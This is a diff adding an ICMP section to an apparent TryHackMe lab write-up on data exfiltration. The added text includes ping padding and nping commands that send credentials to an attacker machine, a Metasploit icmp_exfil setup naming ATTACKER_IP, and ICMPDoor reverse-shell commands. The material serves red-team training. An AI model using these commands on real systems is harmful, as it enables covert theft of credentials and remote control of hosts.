@@ -2,7 +2,7 @@
 title: Data Exfiltration
 date: 2023-10-20
 categories: [Red Teaming]
-tags: [data-exfiltration, red-teaming, ssh, http, http-tunneling, icmp, dns, dns-tunneling]
+tags: [data-exfiltration, red-teaming, ssh, http, http-tunneling, icmp, dns, dns-tunneling, neoreg, metasploit, hex, ping]
 img_path: /assets/red-teaming/data-exfiltration
 mermaid: true
 ---
@@ -40,7 +40,7 @@ It is recommended to connect via SSH to the Jumpbox machine, and perform the roo
 
 The room also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
 
-## 3. TCP Socket Exfiltration
+## 3. TCP Socket Data Exfiltration
 
 This method is **easy to detect** as it relies on non-standard protocols, so it is only used when the attacker knows that they are no network-based security products. 
 
@@ -138,7 +138,7 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
     ![Decoding and unarchiving data](decode-unarchive-data.png)
 
-## 4. SSH Exfiltration
+## 4. SSH Data Exfiltration
 
 To transfer data over SSH, we can either use the Secure Copy Protocol, `scp`, or the SSH client. For this task, we assume that we don't have the `scp` command available. 
 
@@ -164,7 +164,7 @@ The above command creates a tarball and sends it over SSH to the Jumpbox SSH ser
 
 ![SSH transmission](ssh-transmission.png)
 
-## 5. HTTP(S) Exfiltration
+## 5. HTTP Data Exfiltration
 
 ### 5.1 HTTP POST Request
 
@@ -311,3 +311,137 @@ In our network configuration, the `uploader.thm.com` server is reachable from th
 
 ![Flag 2](flag2.jpg)
 
+## ICMP Data Exfiltration
+
+### ICMP Manual Data Exfiltration
+
+The [**Internet Control Message Protocol (ICMP)**](https://www.geeksforgeeks.org/internet-control-message-protocol-icmp/) is mostly used by network admins to troubleshoot network connectivity issues. ICMP has many types, but ICMP `ping` uses Type 8 (*Echo*) and Type 0 (*Reply).
+
+![ICMP Echo Request and ICMP Echo Reply](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)
+
+The ICMP packet structure contains an optional variable-length **Data** section, which is used by the host to match the message to the appropiate process. 
+
+![ICMP packet structure](icmp-packet-structure.png)
+
+Our goal is to exploit this **Data** section by including the data we want to exfiltrate. Let's start by understanding how `ping` works.
+
+```shell
+# send an echo request with a count of 1
+ping 10.10.98.183 -c 1
+```
+
+By capturing the above packet in Wireshark, we can see the following information:
+
+![Wireshark Echo Request Capture](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)
+
+The packet's Data section has been filled with random strings, but it can also be filled with user-defined data. In Linux, the `ping` command has the `-p` option available. According to its [man](https://linux.die.net/man/8/ping) page:
+
+>**-p _pattern_**
+>	You may specify up to 16 ''pad'' bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, **-p ff** will cause the sent packet to be filled with all ones.
+
+This option allows the user to **specify 16 bytes of data in hex format** to send through the packet. For example, if we want to exfiltrate the following credentials: `thm:tryhackme`, we would need to first convert the data to hex, and then pass them to the `ping` command via the `-p` option:
+
+```shell
+# convert data to hex
+echo "thm:tryhackme" | xxd -p
+#  74686d3a7472796861636b6d650a
+
+# pass the hexed data to ping via the pattern option
+ping 10.10.98.183 -c 1 -p  74686d3a7472796861636b6d650a
+```
+
+By capturing the above packet in Wireshark, we can see that we successfully managed to perform manual ICMP data exfiltration!
+
+![Manul ICMP Data Exfiltration - Wireshark capture](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)
+
+### ICMP Data Exfiltration with Metasploit
+
+Metasploit has a module called `icmp_exfil` which uses the same technique we just performed. This module waits to receive a trigger value in order to start writing the data to the disk and then for another trigger value in order to stop. These trigger values are called **Beginning of File(BOF)** and **End of File (EOF)**, respectively.
+
+![Metasploit icmp_exfil BOF and EOF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)
+
+Let's see how to setup Metasploit's `icmp_exfil` module:
+
+```shell
+# launch metasploit
+$ sudo msfconsole
+
+# use the icmp_exfil module
+msf6 > use auxiliary/server/icmp_exfil
+
+# define the required options
+msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER_IP
+# BPF_FILTER => icmp and not src ATTACKER_IP
+msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0
+# INTERFACE => tun0
+
+# run the module
+msf6 auxiliary(server/icmp_exfil) > run
+```
+
+The `BPF_FILTER` options is used so it captures only ICMP packets, `set BPF_FILTER icmp`, and ignore any ICMP packets that have the source IP of the attacking machine, `and not src ATTACKER_IP`.
+
+We also need to select which network interface to listen to. We can see our network interfaces via the `ifconfig` command:
+
+![ifconfig](ifconfig.png)
+
+This room has prepared the `icmp.thm.com` machine as the victim for this task, so we can log into it via SSH (first connect to Jumpbox, and from Jumpbox connect to `icmp.thm.com`). This machinehas the [NPING](https://nmap.org/nping/) tool installed, which is part of the **NMAP** suite.
+
+Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to "*^BOF*", followed by the filename being sent:
+
+```shell
+# send the BOF trigger to the attacking machine
+thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "BOFfile.txt" -c 1 
+```
+
+Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we send the data without converting it to hex first, Metasploit does it for us:
+
+```shell
+# send the data we want to exfiltrate to the attacking machine
+thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "admin:password" -c 1 
+```
+
+Finally, we need to send the **EOF trigger**, which defaults to "*^EOF*", to let Metasploit that we send all the data needed:
+
+```shell
+# send the EOF trigger to the attacking machine
+thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "EOF" -c 1
+```
+
+The whole process can be shown below:
+
+![Metasploit Data Exfiltration](metasploit-icmp-transfer.png)
+
+We can check that the data is as should be:
+
+![Exfiltrated data](loot-file.png)
+
+### ICMP Communication
+
+We can also use the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool, an open-source reverse-shell written in Python3 and [scapy](https://scapy.net/), which, again, uses the same concept as we did before, that is, exploiting the Data section of the ICMP packet.
+
+The only difference with what we did before with Metasploit's `icmp_exfil` module, is that instead of sending credentials, this time we will be sending commands that we want to be executed by the target.
+
+![ICMPDoor tool](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)
+
+While logged into `icmp.thm.com` machine, we need to execute the `icmpdoor` binary. We also need to pass the interface to communicate over (in this case `icmp-host`'s interface) along with the destination IP address (in this case `jump-box`'s IP address):
+
+```shell
+# passing icmp-host's machine interface along with jumpbox's IP
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+```
+
+Next, we need to execute the `icmp-cnc` binary in order to communicate with the victim, `icmp-host`. Once the communication channel over ICMP is established, we are ready to send commands and receive their outputs:
+
+```shell
+# passing jumpbox's machine interface along with icmp-host's IP 
+sudo icmp-cnc -i eth1 -d 192.168.0.121
+```
+
+![icmp-flag](icmp-flag.jpg)
+
+To confim that all communications go through ICMP, we can capture the network traffic using `tcpdump`:
+
+![tcpdump](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)
+
+## DNS Configurations
